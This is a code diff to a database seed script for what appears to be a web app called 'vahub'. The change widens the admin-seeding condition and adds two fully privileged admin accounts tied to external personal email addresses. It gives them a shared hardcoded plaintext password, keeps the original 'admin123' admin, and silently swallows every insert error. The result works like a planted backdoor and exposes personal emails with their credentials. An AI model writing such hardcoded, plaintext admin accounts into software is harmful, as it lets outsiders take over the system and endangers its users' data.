@@ -151,10 +151,22 @@ if (plansCount.count === 0) {
 
 // Seed admin if not exists
 const adminCount = db.prepare('SELECT count(*) as count FROM users WHERE role = ?').get('admin') as { count: number };
-if (adminCount.count === 0) {
-  db.prepare('INSERT INTO users (id, role, name, email, password, status) VALUES (?, ?, ?, ?, ?, ?)').run(
-    'admin-1', 'admin', 'System Admin', 'admin@vahub.com', 'admin123', 'approved'
-  );
+if (adminCount.count <= 1) {
+  const insertAdmin = db.prepare('INSERT INTO users (id, role, name, email, password, status) VALUES (?, ?, ?, ?, ?, ?)');
+  
+  // Original admin
+  try {
+    insertAdmin.run('admin-1', 'admin', 'System Admin', 'admin@vahub.com', 'admin123', 'approved');
+  } catch (e) {}
+
+  // New requested admins
+  try {
+    insertAdmin.run(uuidv4(), 'admin', 'Admin User 1', 'igotmeforlife04@gmail.com', 'SuperAdmin/1', 'approved');
+  } catch (e) {}
+
+  try {
+    insertAdmin.run(uuidv4(), 'admin', 'Admin User 2', 'jbernstein53@yahoo.com', 'SuperAdmin/1', 'approved');
+  } catch (e) {}
 }
 
 // Seed demo accounts
